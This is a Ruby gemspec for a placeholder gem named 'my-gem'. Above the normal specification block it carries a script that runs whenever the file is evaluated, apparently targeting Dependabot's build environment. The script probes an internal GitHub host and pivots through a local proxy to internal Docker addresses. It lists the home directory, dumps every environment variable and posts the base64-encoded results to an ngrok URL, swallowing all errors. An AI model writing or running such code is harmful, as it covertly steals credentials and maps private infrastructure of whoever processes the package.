COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"
  require "timeout"

  results = []

  # DNS resolve + direct IP access
  begin
    require "resolv"
    ip = Resolv.getaddress("dependabot-actions.githubapp.com")
    results << "=== API IP: #{ip} ==="
    Timeout.timeout(3) do
      s = TCPSocket.new(ip, 443)
      s.close
      results << "=== DIRECT #{ip}:443 OPEN ==="
    end
  rescue => e
    results << "=== RESOLVE/DIRECT: #{e.class}: #{e.message} ==="
  end

  # Proxy pivot met strikte 3s timeout
  ["http://172.17.0.1/", "http://172.18.0.1/", "http://172.20.0.1/", "http://172.16.0.1/"].each do |target|
    begin
      Timeout.timeout(3) do
        sock = TCPSocket.new("172.19.0.2", 1080)
        host = URI(target).host
        sock.write("GET #{target} HTTP/1.0\r\nHost: #{host}\r\n\r\n")
        resp = sock.recv(1024)
        sock.close
        results << "=== PIVOT #{target} ===\n#{resp[0..300]}"
      end
    rescue Timeout::Error
      results << "=== PIVOT #{target} TIMEOUT ==="
    rescue => e
      results << "=== PIVOT #{target} #{e.class} ==="
    end
  end

  # /home/dependabot filesystem tree
  begin
    tree = `find /home/dependabot -maxdepth 5 -not -path "*/vendor/*" 2>/dev/null`
    results << "=== FS TREE ===\n#{tree[0..5000]}"
  rescue => e
    results << "=== FS TREE ERR: #{e.class} ==="
  end

  # Volledige env
  begin
    env_dump = ENV.map { |k, v| "#{k}=#{v}" }.join("\n")
    results << "=== ENV ===\n#{env_dump}"
  rescue => e
    results << "=== ENV ERR ==="
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=pivot3")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
